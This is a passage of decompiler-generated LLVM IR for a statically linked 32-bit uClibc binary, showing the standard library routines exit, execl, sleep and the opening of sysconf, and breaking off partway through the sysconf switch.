  %v0_80509ee.pre = load i32, i32* @edx, align 4
  br i1 %v4_80509e5, label %dec_label_pc_80509eb, label %dec_label_pc_80509e9

dec_label_pc_80509e9:                             ; preds = %dec_label_pc_80509e3
  %v1_80509e9 = sub i32 0, %v0_80509ee.pre
  store i32 %v1_80509e9, i32* @edx, align 4
  br label %dec_label_pc_80509eb

dec_label_pc_80509eb:                             ; preds = %dec_label_pc_80509e3, %dec_label_pc_80509e9
  %v0_80509ee = phi i32 [ %v1_80509e9, %dec_label_pc_80509e9 ], [ %v0_80509ee.pre, %dec_label_pc_80509e3 ]
  store i32 %v0_80509ee, i32* %eax.global-to-local, align 4
  %v2_80509f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80509f0, i32* @ebx, align 4
  ret i32 %v0_80509ee

; uselistorder directives
  uselistorder i32 %v0_80509ee, { 1, 0 }
  uselistorder i32 %v0_80509e3, { 1, 0 }
  uselistorder i32 %v0_8050984, { 0, 2, 1 }
  uselistorder i32 %v1_8050983, { 1, 0 }
  uselistorder i32 %v2_805097f, { 1, 0 }
  uselistorder i32 %v1_805097c, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_80509ab, { 1, 0 }
  uselistorder i32 %v0_8050964, { 1, 0 }
  uselistorder i32 %v4_8050992, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_8050956, { 1, 0, 2 }
  uselistorder i32 %v2_805093a, { 1, 0 }
  uselistorder i32 %v1_8050933, { 1, 0 }
  uselistorder i32 %v1_805092c, { 1, 0, 2 }
  uselistorder i32 %v0_805092b, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_80508fa.lcssa, { 1, 0 }
  uselistorder i32 %v0_80508f9.lcssa, { 1, 0 }
  uselistorder i32 %v1_80508f9, { 0, 3, 2, 1 }
  uselistorder i32 %v4_80508ed, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_80508e7, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 10, 7, 8, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32 -17, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80509eb, { 1, 0 }
  uselistorder label %dec_label_pc_80509e3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80509bf, { 1, 0 }
  uselistorder label %dec_label_pc_805097c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050966, { 1, 0 }
  uselistorder label %dec_label_pc_8050947, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805093d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050919, { 1, 0 }
  uselistorder label %dec_label_pc_8050918, { 1, 0 }
  uselistorder label %dec_label_pc_80508f9, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8050a0b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050a0b, i32* @ebx, align 4
  %v2_8050a10 = call i32 @__pthread_return_void(i32 %v2_8050a0b, i32 134548959)
  %v1_8050a1c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80553e0.147 to i32))
  %v0_8050a21 = load i32, i32* @global_var_805b478.148, align 8
  store i32 %v0_8050a21, i32* @eax, align 4
  %v1_8050a29 = icmp eq i32 %v0_8050a21, 0
  br i1 %v1_8050a29, label %dec_label_pc_8050a36, label %dec_label_pc_8050a2d

dec_label_pc_8050a2d:                             ; preds = %entry
  %v0_8050a30 = load i32, i32* @esi, align 4
  %v1_8050a31 = call i32 @unknown_0(i32 %v0_8050a30)
  store i32 %v1_8050a31, i32* @eax, align 4
  br label %dec_label_pc_8050a36

dec_label_pc_8050a36:                             ; preds = %entry, %dec_label_pc_8050a2d
  %v2_8050a3b = call i32 @__pthread_return_void(i32 %v2_8050a0b, i32 1)
  %v0_8050a40 = call i32 @__GI___uClibc_fini()
  %v0_8050a51 = call i32 @_stdio_term()
  %v0_8050a59 = load i32, i32* @esi, align 4
  %v1_8050a5a = call i32 @__GI__exit(i32 %v0_8050a59)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 11, 2, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_8050a36, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8050a64 = load i32, i32* @ebx, align 4
  store i32 %v0_8050a64, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8050a67 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8050a67, i32* %eax.global-to-local, align 4
  %v12_8050a6a = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8050a70

dec_label_pc_8050a70:                             ; preds = %dec_label_pc_8050a70, %entry
  %v0_8050a73 = phi i32 [ 0, %entry ], [ %v1_8050a73, %dec_label_pc_8050a70 ]
  %stack_var_-16.0 = phi i32 [ %v2_8050a67, %entry ], [ %v1_8050a74, %dec_label_pc_8050a70 ]
  %v1_8050a73 = add i32 %v0_8050a73, 1
  store i32 %v1_8050a73, i32* %esi.global-to-local, align 4
  %v1_8050a74 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8050a74, i32* %eax.global-to-local, align 4
  %v1_8050a7a = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8050a7a = load i32, i32* %v1_8050a7a, align 4
  %v3_8050a7a = icmp eq i32 %v2_8050a7a, 0
  %v1_8050a7d = icmp eq i1 %v3_8050a7a, false
  br i1 %v1_8050a7d, label %dec_label_pc_8050a70, label %dec_label_pc_8050a7f

dec_label_pc_8050a7f:                             ; preds = %dec_label_pc_8050a70
  %v1_8050a7f = mul i32 %v1_8050a73, 4
  %v2_8050a7f = add i32 %v1_8050a7f, 34
  %v1_8050a86 = and i32 %v2_8050a7f, -16
  %v2_8050a89 = sub i32 %v12_8050a6a, %v1_8050a86
  %v1_8050a8e = add i32 %v2_8050a89, 15
  %v1_8050a92 = and i32 %v1_8050a8e, -16
  store i32 %v1_8050a92, i32* @ebx, align 4
  store i32 %v1_8050a92, i32* %ecx.global-to-local, align 4
  %v2_8050a97 = inttoptr i32 %v1_8050a92 to i32*
  store i32 %arg2, i32* %v2_8050a97, align 16
  store i32 %v2_8050a67, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050a9f

dec_label_pc_8050a9f:                             ; preds = %dec_label_pc_8050a9f, %dec_label_pc_8050a7f
  %stack_var_-16.1 = phi i32 [ %v2_8050a67, %dec_label_pc_8050a7f ], [ %v1_8050aa6, %dec_label_pc_8050a9f ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8050aa2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050aa2 = add i32 %v0_8050aa2, 4
  store i32 %v1_8050aa2, i32* %ecx.global-to-local, align 4
  %v0_8050aa5 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050aa5 = add i32 %v0_8050aa5, -1
  %v8_8050aa5 = icmp eq i32 %v1_8050aa5, 0
  store i32 %v1_8050aa5, i32* %esi.global-to-local, align 4
  %v1_8050aa6 = add i32 %stack_var_-16.1, 4
  %v1_8050aac = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8050aac = load i32, i32* %v1_8050aac, align 4
  store i32 %v2_8050aac, i32* %eax.global-to-local, align 4
  %v2_8050aae = inttoptr i32 %v1_8050aa2 to i32*
  store i32 %v2_8050aac, i32* %v2_8050aae, align 4
  %v1_8050ab0 = icmp eq i1 %v8_8050aa5, false
  br i1 %v1_8050ab0, label %dec_label_pc_8050a9f, label %dec_label_pc_8050ab2

dec_label_pc_8050ab2:                             ; preds = %dec_label_pc_8050a9f
  %v0_8050ab2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ab2 = load i32, i32* @esp, align 4
  %v2_8050ab2 = add i32 %v1_8050ab2, -4
  %v3_8050ab2 = inttoptr i32 %v2_8050ab2 to i32*
  store i32 %v0_8050ab2, i32* %v3_8050ab2, align 4
  %v0_8050ab3 = load i32, i32* @global_var_805b480.149, align 128
  %v2_8050ab3 = add i32 %v1_8050ab2, -8
  %v3_8050ab3 = inttoptr i32 %v2_8050ab3 to i32*
  store i32 %v0_8050ab3, i32* %v3_8050ab3, align 4
  %v0_8050ab9 = load i32, i32* @ebx, align 4
  %v2_8050ab9 = add i32 %v1_8050ab2, -12
  %v3_8050ab9 = inttoptr i32 %v2_8050ab9 to i32*
  store i32 %v0_8050ab9, i32* %v3_8050ab9, align 4
  %v5_8050aba = add i32 %v1_8050ab2, -16
  %v6_8050aba = inttoptr i32 %v5_8050aba to i32*
  store i32 %arg1, i32* %v6_8050aba, align 4
  %v1_8050abd = inttoptr i32 %v1_8050aa6 to i8*
  %v2_8050abd = call i32 @__GI_execve(i8* %v1_8050abd)
  store i32 %v2_8050abd, i32* %eax.global-to-local, align 4
  %v2_8050ac5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050ac5, i32* @ebx, align 4
  ret i32 %v2_8050abd

; uselistorder directives
  uselistorder i32 %v1_8050aa5, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8050a74, { 1, 0 }
  uselistorder i32 %v1_8050a73, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8050a67, { 0, 2, 1, 3 }
  uselistorder i32 -12, { 2, 61, 60, 8, 9, 3, 4, 5, 6, 7, 10, 11, 0, 12, 62, 21, 15, 13, 14, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 30, 31, 32, 28, 27, 29, 33, 51, 52, 48, 49, 50, 45, 1, 46, 47, 44, 41, 42, 43, 40, 38, 39, 37, 35, 36, 34, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 -8, { 5, 56, 57, 58, 55, 11, 12, 6, 7, 8, 9, 10, 13, 14, 15, 16, 18, 0, 17, 1, 2, 19, 20, 21, 3, 22, 23, 24, 26, 27, 25, 28, 29, 30, 31, 47, 48, 44, 45, 46, 42, 4, 43, 41, 39, 40, 38, 36, 37, 35, 33, 34, 32, 49, 50, 51, 52, 53, 54 }
  uselistorder i32 -16, { 20, 119, 120, 26, 27, 21, 22, 23, 24, 25, 28, 29, 19, 30, 31, 46, 38, 35, 36, 37, 39, 3, 1, 2, 4, 5, 40, 34, 41, 6, 42, 7, 43, 44, 45, 32, 33, 0, 47, 48, 54, 50, 49, 51, 52, 53, 55, 9, 10, 61, 57, 56, 58, 59, 60, 62, 11, 12, 67, 68, 69, 70, 71, 66, 64, 63, 65, 8, 72, 13, 14, 75, 76, 74, 77, 78, 73, 79, 15, 16, 109, 110, 111, 106, 107, 108, 101, 102, 103, 104, 105, 100, 95, 96, 97, 98, 99, 94, 90, 91, 92, 93, 87, 86, 88, 89, 82, 83, 84, 85, 80, 81, 17, 18, 112, 113, 114, 115, 116, 117, 118 }
}

define i32 @sleep() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8050acc = load i32, i32* @ebp, align 4
  %v0_8050acd = load i32, i32* @edi, align 4
  %v0_8050ace = load i32, i32* @esi, align 4
  %v0_8050acf = load i32, i32* @ebx, align 4
  %v15_8050ad0 = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %tmp13, i32* %edx.global-to-local, align 4
  %v1_8050ae2 = icmp eq i32 %tmp13, 0
  %v1_8050ae4 = icmp eq i1 %v1_8050ae2, false
  br i1 %v1_8050ae4, label %dec_label_pc_8050af6.preheader, label %dec_label_pc_8050c43

dec_label_pc_8050af6.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050aeb

dec_label_pc_8050aeb:                             ; preds = %dec_label_pc_8050aeb.dec_label_pc_8050aeb_crit_edge, %dec_label_pc_8050af6.preheader
  %v0_8050aeb = phi i32 [ %v15_8050ad0, %dec_label_pc_8050af6.preheader ], [ %v0_8050aeb.pre, %dec_label_pc_8050aeb.dec_label_pc_8050aeb_crit_edge ]
  %v1_8050af629 = phi i32 [ 31, %dec_label_pc_8050af6.preheader ], [ %v1_8050af6, %dec_label_pc_8050aeb.dec_label_pc_8050aeb_crit_edge ]
  %v2_8050aeb = mul i32 %v1_8050af629, 4
  %v3_8050aeb = add i32 %v2_8050aeb, 292
  %v4_8050aeb = add i32 %v3_8050aeb, %v0_8050aeb
  %v5_8050aeb = inttoptr i32 %v4_8050aeb to i32*
  store i32 0, i32* %v5_8050aeb, align 4
  %v0_8050af6.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050af6 = add i32 %v0_8050af6.pre, -1
  %v9_8050af6 = icmp slt i32 %v1_8050af6, 0
  store i32 %v1_8050af6, i32* %eax.global-to-local, align 4
  %v1_8050af7 = icmp eq i1 %v9_8050af6, false
  br i1 %v1_8050af7, label %dec_label_pc_8050aeb.dec_label_pc_8050aeb_crit_edge, label %dec_label_pc_8050af9

dec_label_pc_8050aeb.dec_label_pc_8050aeb_crit_edge: ; preds = %dec_label_pc_8050aeb
  %v0_8050aeb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050aeb

dec_label_pc_8050af9:                             ; preds = %dec_label_pc_8050aeb
  store i32 %tmp13, i32* %stack_var_-24, align 4
  %v2_8050b0f = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8050b0f, i32* @ebx, align 4
  store i32 %v2_8050b0f, i32* %stack_var_-460, align 4
  %v4_8050b17 = call i32 @__sigaddset(i32 %v2_8050b0f, i32 17, i32 %v1_8050af6, i32 %v1_8050af6)
  store i32 %v4_8050b17, i32* %eax.global-to-local, align 4
  %v2_8050b1f = icmp slt i32 %v4_8050b17, 0
  br i1 %v2_8050b1f, label %dec_label_pc_8050c47, label %dec_label_pc_8050b27

dec_label_pc_8050b27:                             ; preds = %dec_label_pc_8050af9
  %v2_8050b28 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8050b28, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8050b33 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8050b33 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8050b33, i32 %v2_8050b28)
  store i32 %v4_8050b33, i32* %eax.global-to-local, align 4
  %v1_8050b3b = icmp eq i32 %v4_8050b33, 0
  %v1_8050b3d = icmp eq i1 %v1_8050b3b, false
  br i1 %v1_8050b3d, label %dec_label_pc_8050c47, label %dec_label_pc_8050b43

dec_label_pc_8050b43:                             ; preds = %dec_label_pc_8050b27
  store i32 %v2_8050b28, i32* %stack_var_-460, align 4
  %v4_8050b48 = call i32 @__sigismember(i32 %v2_8050b28, i32 17, i32 %v4_8050b33, i32 %v4_8050b33)
  store i32 %v4_8050b48, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8050b55 = icmp eq i32 %v4_8050b48, 0
  br i1 %v1_8050b55, label %dec_label_pc_8050b69.preheader, label %dec_label_pc_8050c11

dec_label_pc_8050b69.preheader:                   ; preds = %dec_label_pc_8050b43
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050b5e

dec_label_pc_8050b5e:                             ; preds = %dec_label_pc_8050b5e.dec_label_pc_8050b5e_crit_edge, %dec_label_pc_8050b69.preheader
  %v0_8050b5e = phi i32 [ %v15_8050ad0, %dec_label_pc_8050b69.preheader ], [ %v0_8050b5e.pre, %dec_label_pc_8050b5e.dec_label_pc_8050b5e_crit_edge ]
  %v1_8050b6928 = phi i32 [ 31, %dec_label_pc_8050b69.preheader ], [ %v1_8050b69, %dec_label_pc_8050b5e.dec_label_pc_8050b5e_crit_edge ]
  %v2_8050b5e = mul i32 %v1_8050b6928, 4
  %v3_8050b5e = add i32 %v2_8050b5e, 292
  %v4_8050b5e = add i32 %v3_8050b5e, %v0_8050b5e
  %v5_8050b5e = inttoptr i32 %v4_8050b5e to i32*
  store i32 0, i32* %v5_8050b5e, align 4
  %v0_8050b69.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8050b69 = add i32 %v0_8050b69.pre, -1
  %v9_8050b69 = icmp slt i32 %v1_8050b69, 0
  store i32 %v1_8050b69, i32* %edx.global-to-local, align 4
  %v1_8050b6a = icmp eq i1 %v9_8050b69, false
  br i1 %v1_8050b6a, label %dec_label_pc_8050b5e.dec_label_pc_8050b5e_crit_edge, label %dec_label_pc_8050b6c

dec_label_pc_8050b5e.dec_label_pc_8050b5e_crit_edge: ; preds = %dec_label_pc_8050b5e
  %v0_8050b5e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050b5e

dec_label_pc_8050b6c:                             ; preds = %dec_label_pc_8050b5e
  store i32 %v2_8050b0f, i32* %eax.global-to-local, align 4
  store i32 %v2_8050b0f, i32* %stack_var_-460, align 4
  %v4_8050b78 = call i32 @__sigaddset(i32 %v2_8050b0f, i32 17, i32 0, i32 0)
  store i32 %v4_8050b78, i32* %eax.global-to-local, align 4
  %v2_8050b80 = icmp slt i32 %v4_8050b78, 0
  br i1 %v2_8050b80, label %dec_label_pc_8050c47, label %dec_label_pc_8050b88

dec_label_pc_8050b88:                             ; preds = %dec_label_pc_8050b6c
  %v2_8050b89 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8050b89, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8050b92 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8050b89)
  store i32 %v4_8050b92, i32* %eax.global-to-local, align 4
  %v2_8050b9a = icmp slt i32 %v4_8050b92, 0
  %v1_8050b9c = icmp eq i1 %v2_8050b9a, false
  br i1 %v1_8050b9c, label %dec_label_pc_8050bc6, label %dec_label_pc_8050b9e

dec_label_pc_8050b9e:                             ; preds = %dec_label_pc_8050b88
  %v0_8050b9e = load i32, i32* %stack_var_-460, align 4
  %v1_8050b9e = call i32 @__errno_location(i32 %v0_8050b9e)
  store i32 %v1_8050b9e, i32* %eax.global-to-local, align 4
  store i32 %v1_8050b9e, i32* @ebx, align 4
  %v1_8050ba5 = inttoptr i32 %v1_8050b9e to i32*
  %v2_8050ba5 = load i32, i32* %v1_8050ba5, align 4
  store i32 %v2_8050ba5, i32* @esi, align 4
  store i32 %v2_8050b28, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8050bb4 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8050bb4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8050bb4, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8050bbf = load i32, i32* @esi, align 4
  %v1_8050bbf = load i32, i32* @ebx, align 4
  %v2_8050bbf = inttoptr i32 %v1_8050bbf to i32*
  store i32 %v0_8050bbf, i32* %v2_8050bbf, align 4
  %v0_8050c54.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c4a

dec_label_pc_8050bc6:                             ; preds = %dec_label_pc_8050b88
  %v3_8050bc6 = load i32, i32* %stack_var_-420, align 4
  %v12_8050bc6 = icmp eq i32 %v3_8050bc6, 1
  %v2_8050bd2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050bd2, i32* @ebx, align 4
  %v1_8050bd9 = icmp eq i1 %v12_8050bc6, false
  br i1 %v1_8050bd9, label %dec_label_pc_8050c00, label %dec_label_pc_8050bdb

dec_label_pc_8050bdb:                             ; preds = %dec_label_pc_8050bc6
  %v0_8050bdb = load i32, i32* @edi, align 4
  store i32 %v2_8050bd2, i32* %stack_var_-460, align 4
  %v4_8050bdf = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8050bdf = call i32 @__libc_nanosleep(%timespec* %v4_8050bdf, i32 %v2_8050bd2, i32 %v0_8050bdb, i32 %v0_8050bdb)
  store i32 %v5_8050bdf, i32* %eax.global-to-local, align 4
  store i32 %v5_8050bdf, i32* @edi, align 4
  %v1_8050be6 = call i32 @__errno_location(i32 %v2_8050bd2)
  store i32 %v1_8050be6, i32* %eax.global-to-local, align 4
  store i32 %v1_8050be6, i32* @ebx, align 4
  %v1_8050bf0 = inttoptr i32 %v1_8050be6 to i32*
  %v2_8050bf0 = load i32, i32* %v1_8050bf0, align 4
  store i32 %v2_8050bf0, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8050bf7 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8050bf7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8050bf7, i32 0)
  store i32 %v4_8050bf7, i32* %eax.global-to-local, align 4
  %v0_8050bfc = load i32, i32* @esi, align 4
  %v1_8050bfc = load i32, i32* @ebx, align 4
  %v2_8050bfc = inttoptr i32 %v1_8050bfc to i32*
  store i32 %v0_8050bfc, i32* %v2_8050bfc, align 4
  %v0_8050c26.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050c23

dec_label_pc_8050c00:                             ; preds = %dec_label_pc_8050bc6
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8050c06 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8050c06 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8050c06, i32 0)
  store i32 %v4_8050c06, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050c1c

dec_label_pc_8050c11:                             ; preds = %dec_label_pc_8050b43
  %v2_8050c13 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050c13, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c1c

dec_label_pc_8050c1c:                             ; preds = %dec_label_pc_8050c00, %dec_label_pc_8050c11
  %storemerge3.pre-phi = phi i32 [ %v2_8050bd2, %dec_label_pc_8050c00 ], [ %v2_8050c13, %dec_label_pc_8050c11 ]
  %v3_8050c1c = phi i32 [ %v2_8050b28, %dec_label_pc_8050c00 ], [ %v4_8050b48, %dec_label_pc_8050c11 ]
  %v2_8050c1c = phi i32 [ 0, %dec_label_pc_8050c00 ], [ %v4_8050b48, %dec_label_pc_8050c11 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8050c1c = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8050c1c = call i32 @__libc_nanosleep(%timespec* %v4_8050c1c, i32 %storemerge3.pre-phi, i32 %v2_8050c1c, i32 %v3_8050c1c)
  store i32 %v5_8050c1c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c23

dec_label_pc_8050c23:                             ; preds = %dec_label_pc_8050bdb, %dec_label_pc_8050c1c
  %v0_8050c26 = phi i32 [ %v0_8050c26.pre, %dec_label_pc_8050bdb ], [ %v5_8050c1c, %dec_label_pc_8050c1c ]
  %v1_8050c26 = icmp eq i32 %v0_8050c26, 0
  br i1 %v1_8050c26, label %dec_label_pc_8050c43, label %dec_label_pc_8050c2a

dec_label_pc_8050c2a:                             ; preds = %dec_label_pc_8050c23
  %v4_8050c3a = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8050c3a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c4a

dec_label_pc_8050c43:                             ; preds = %entry, %dec_label_pc_8050c23
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c4a

dec_label_pc_8050c47:                             ; preds = %dec_label_pc_8050b6c, %dec_label_pc_8050b27, %dec_label_pc_8050af9
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c4a

dec_label_pc_8050c4a:                             ; preds = %dec_label_pc_8050c43, %dec_label_pc_8050c2a, %dec_label_pc_8050b9e, %dec_label_pc_8050c47
  %v0_8050c54 = phi i32 [ 0, %dec_label_pc_8050c43 ], [ %v4_8050c3a, %dec_label_pc_8050c2a ], [ %v0_8050c54.pre, %dec_label_pc_8050b9e ], [ -1, %dec_label_pc_8050c47 ]
  store i32 %v0_8050acf, i32* @ebx, align 4
  store i32 %v0_8050ace, i32* @esi, align 4
  store i32 %v0_8050acd, i32* @edi, align 4
  store i32 %v0_8050acc, i32* @ebp, align 4
  ret i32 %v0_8050c54

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8050be6, { 1, 0, 2 }
  uselistorder i32 %v2_8050bd2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8050b69, { 2, 1, 0 }
  uselistorder i32 %v4_8050b48, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8050b28, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_8050b0f, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8050af6, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32 %tmp13, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_8050c4a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8050c43, { 1, 0 }
  uselistorder label %dec_label_pc_8050c23, { 1, 0 }
  uselistorder label %dec_label_pc_8050c1c, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_8050c77 [
    i32 0, label %dec_label_pc_8050c87
    i32 1, label %dec_label_pc_8050d6c
    i32 2, label %dec_label_pc_8050c91
    i32 3, label %dec_label_pc_8050c9b
    i32 4, label %dec_label_pc_8050ca5
    i32 5, label %dec_label_pc_8050d3b
    i32 6, label %dec_label_pc_8050cad
    i32 7, label %dec_label_pc_8050c6d
    i32 8, label %dec_label_pc_8050c6d
    i32 9, label %dec_label_pc_8050c6d
    i32 10, label %dec_label_pc_8050c6d
    i32 11, label %dec_label_pc_8050c6d
    i32 12, label %dec_label_pc_8050c6d
    i32 13, label %dec_label_pc_8050c6d
    i32 14, label %dec_label_pc_8050c6d
    i32 15, label %dec_label_pc_8050c6d
    i32 16, label %dec_label_pc_8050c6d
    i32 17, label %dec_label_pc_8050c6d
    i32 18, label %dec_label_pc_8050c6d
    i32 19, label %dec_label_pc_8050c6d
    i32 20, label %dec_label_pc_8050c6d
    i32 21, label %dec_label_pc_8050c6d
    i32 22, label %dec_label_pc_8050c6d
    i32 23, label %dec_label_pc_8050d6c
    i32 24, label %dec_label_pc_8050d6c
    i32 25, label %dec_label_pc_8050d78
    i32 26, label %dec_label_pc_8050d49
    i32 27, label %dec_label_pc_8050d6c
    i32 28, label %dec_label_pc_8050cbf
    i32 29, label %dec_label_pc_8050d42
    i32 30, label %dec_label_pc_8050cb7
    i32 31, label %dec_label_pc_8050d57
    i32 32, label %dec_label_pc_8050d6c
    i32 33, label %dec_label_pc_8050d6c
    i32 34, label %dec_label_pc_8050d6c
    i32 35, label %dec_label_pc_8050d50
    i32 36, label %dec_label_pc_8050d7f
    i32 37, label %dec_label_pc_8050d86
    i32 38, label %dec_label_pc_8050d7f
    i32 39, label %dec_label_pc_8050cc9
    i32 40, label %dec_label_pc_8050d8d
    i32 41, label %dec_label_pc_8050d6c
    i32 42, label %dec_label_pc_8050d57
    i32 43, label %dec_label_pc_8050d86
    i32 44, label %dec_label_pc_8050d94
    i32 45, label %dec_label_pc_8050d86
    i32 46, label %dec_label_pc_8050d42
    i32 47, label %dec_label_pc_8050d42
    i32 48, label %dec_label_pc_8050d42
    i32 49, label %dec_label_pc_8050d6c
    i32 50, label %dec_label_pc_8050d6c
    i32 51, label %dec_label_pc_8050d42
    i32 52, label %dec_label_pc_8050d42
